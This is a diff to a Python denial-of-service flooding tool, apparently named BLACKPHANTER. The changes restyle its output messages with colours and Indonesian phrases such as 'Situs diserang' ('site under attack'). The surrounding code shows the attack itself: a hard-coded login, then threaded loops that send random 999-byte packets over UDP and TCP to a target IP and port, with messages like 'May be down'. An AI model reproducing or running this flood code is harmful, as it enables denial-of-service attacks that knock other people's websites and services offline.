@@ -58,7 +58,7 @@ while attemps < 100:
     password = input("\033[31mEnter your password: \033[0m")
 
     if username == 'bp4' and password == 'bp4':
-        print("Hai...! Welcome to zona attack BLACKPHANTER")
+        print("\033[97m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -79,9 +79,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i [+] "\033[1mtcp\033[32mנשלח באופן אקראי\033[0m")
+			print(i + "\033[35mtcp\033[32mנשלח באופן אקראי\033[0m")
 		except:
-			print("[!] Error!!!")
+			print("\033[31m[!] \033[92m May be down..!\033[0m")
 
 def run2():
 	data = random._urandom(999)
@@ -93,10 +93,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + "\033[32mSitus \033[4mdiserang...! \033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("\033[31m[!] \033[92m May be down..!\033[0m")
             
 
 def run3():
@@ -109,10 +109,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"\033[33mPermintaan \033[94mterkirim \033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("\033[31m[!] \033[92m May be down..!\033[0m")
             
   
 def run4():
@@ -125,10 +125,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + "\033[95mZona \033[96m" +ip+ "\033[32mtidak aman!! \033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("\033[31m[!] \033[92m May be down..!\033[0m")
 											
             
 for y in range(threads):
